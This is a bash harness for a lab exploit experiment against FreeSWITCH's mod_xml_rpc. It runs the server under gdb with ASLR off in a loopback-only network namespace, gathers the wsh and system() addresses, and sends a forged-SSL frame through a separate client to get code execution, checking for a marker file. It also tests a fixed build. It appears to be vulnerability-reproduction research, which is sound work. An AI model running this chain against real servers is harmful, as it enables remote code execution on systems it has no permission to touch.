#!/usr/bin/env bash
# Rung-5 forged-SSL experiment against the live loopback mod_xml_rpc target.
# Separate from run_live_gdb.sh; that reproduction script is left untouched.
# All traffic stays in a private netns with only lo. No off-loopback probe.
#
# MODE=calibrate  send the known rung-4 sentinel frame; print wsh, system(),
#                 and the post-copy handle fields under ASLR-off gdb.
# MODE=exploit    send the forged-SSL frame; WSH and SYSADDR are wire bytes.
# MODE=trace      same frame, gdb breakpoint on system() to observe its rdi.
# MODE=safe       send a 4-byte in-bounds frame on the vulnerable build.
# MODE=fixed      send the forged frame to the pinned fixed build.
set -u
cd "$(dirname "$0")" || exit 1
BASE=$PWD
CONF=$BASE/run/conf
PREFIX=$BASE/run/install
MODE=${1:-calibrate}
WSH=${2:-0}
SYSADDR=${3:-0}
MARKER=${4:-r5}
FIXED_ROOT=/home/mesh-home/mishe-tauftauf2shell/lab/build/evidence/w26-witness-fslive-fixed
LOG=$BASE/logs/rce_${MODE}_$(date -u +%Y%m%dT%H%M%SZ)
mkdir -p "$LOG" "$BASE/run/log" "$BASE/run/run" "$BASE/run/db"
rm -f "$BASE/$MARKER"
export BASE CONF PREFIX LOG MODE WSH SYSADDR MARKER FIXED_ROOT

sudo -n --preserve-env=BASE,CONF,PREFIX,LOG,MODE,WSH,SYSADDR,MARKER,FIXED_ROOT unshare -n bash -s <<'EOS'
set -u
BASE="$BASE"; CONF="$CONF"; PREFIX="$PREFIX"; LOG="$LOG"
MODE="$MODE"; WSH="$WSH"; SYSADDR="$SYSADDR"; MARKER="$MARKER"; FIXED_ROOT="$FIXED_ROOT"
ip link set lo up
ip route add 127.0.0.0/8 dev lo 2>/dev/null || true
ip -o addr show lo > "$LOG/netns.txt"

if [ "$MODE" = "fixed" ]; then
  PREFIX="$FIXED_ROOT/run/install"; CONF="$FIXED_ROOT/run/conf"
fi

BREAKCMDS=()
if [ "$MODE" = "trace" ]; then BREAKCMDS=(-ex 'break system'); fi
GDBCMDS=(
  -ex 'set pagination off'
  -ex 'set confirm off'
  -ex 'set disable-randomization on'
  -ex 'handle SIGPIPE nostop noprint pass'
  "${BREAKCMDS[@]}"
  -ex 'run'
  -ex 'printf "STOP_PC=%p\n", $pc'
  -ex 'printf "SYSTEM_RDI=%p\n", $rdi'
  -ex 'x/s $rdi'
  -ex 'bt 10'
  -ex 'printf "FAULT_PC=%p\n", $pc'
  -ex 'frame 1'
  -ex 'printf "WSH_ADDR=%p\n", wsh'
  -ex 'printf "SSL_PTR=%p\n", wsh->ssl'
  -ex 'frame 0'
  -ex 'printf "SSL_ARG=%p\n", $rdi'
  -ex 'printf "SYSTEM_ADDR=%p\n", system'
  -ex 'info sharedlibrary mod_xml_rpc'
)
gdb -q -batch "${GDBCMDS[@]}" \
  --args "$PREFIX/bin/freeswitch" -c -nf -nonat -nosql \
    -conf "$CONF" -log "$BASE/run/log" -run "$BASE/run/run" \
    -db "$BASE/run/db" -mod "$PREFIX/mod" \
  > "$LOG/gdb.txt" 2>&1 &
GDBPID=$!
echo "GDB_PID=$GDBPID"

READY=0
for i in $(seq 1 60); do
  if ss -ltn 2>/dev/null | grep -q ':18080'; then READY=1; break; fi
  if ! kill -0 "$GDBPID" 2>/dev/null; then break; fi
  sleep 1
done
echo "LISTENER_READY=$READY"
ss -ltn > "$LOG/listen.txt" 2>&1

if [ "$READY" -eq 1 ]; then
  case "$MODE" in
    calibrate) python3 "$BASE/live_client.py" 18080 exploit > "$LOG/client.txt" 2>&1 ;;
    safe)      python3 "$BASE/live_client.py" 18080 safe > "$LOG/client.txt" 2>&1 ;;
    exploit|fixed|trace) python3 "$BASE/rce_client.py" exploit 18080 "$WSH" "$SYSADDR" "$MARKER" > "$LOG/client.txt" 2>&1 ;;
  esac
fi

for i in $(seq 1 30); do
  kill -0 "$GDBPID" 2>/dev/null || break
  sleep 1
done
if kill -0 "$GDBPID" 2>/dev/null; then
  echo "GDB_STILL_RUNNING=1"
  kill -TERM "$GDBPID" 2>/dev/null; sleep 1; kill -KILL "$GDBPID" 2>/dev/null
else
  echo "GDB_EXITED=1"
fi
echo "MARKER_EXISTS=$(test -f "$BASE/$MARKER" && echo 1 || echo 0)"
cp "$BASE/$MARKER" "$LOG/marker.txt" 2>/dev/null || true
echo '== gdb tail =='
tail -30 "$LOG/gdb.txt"
EOS
